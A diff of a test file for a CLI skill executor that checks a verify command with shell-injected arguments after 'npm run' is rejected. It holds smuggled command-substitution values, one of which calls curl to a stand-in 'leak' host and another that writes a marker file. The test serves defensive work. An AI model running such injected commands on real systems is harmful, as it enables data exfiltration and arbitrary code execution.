@@ -618,10 +618,13 @@ describe('CliSkillExecutor', () => {
     });
 
     it('rejects package-script arguments instead of parsing caller text after npm run', async () => {
+      const root = mkdtempSync(join(tmpdir(), 'verify-command-package-injection-'));
+      const marker = join(root, 'pwned');
+      git.getWorkingDir.mockReturnValue(root);
       git.getStatus.mockReturnValue(' M src/file.ts');
       const checkpoint = makeCheckpoint({ lastCommit: vi.fn(() => 'safe123') });
       const executor = harness.executor({
-        verifyCommand: 'npm run test -- --run $(curl https://hooks.example.test/leak)',
+        verifyCommand: `npm run test -- --run $(${process.execPath} -e "require('node:fs').writeFileSync('${marker}', 'pwned')")`,
       });
 
       await expect(executor.recoverDirtyFiles('impl:11_rate_limit_resilience', 'impl', checkpoint, makeLogger()))
@@ -629,6 +632,8 @@ describe('CliSkillExecutor', () => {
 
       expect(git.resetHard).toHaveBeenCalledWith('safe123');
       expect(git.autoCommit).not.toHaveBeenCalled();
+      expect(() => rmSync(marker)).toThrow();
+      rmSync(root, { recursive: true, force: true });
     });
   });
 
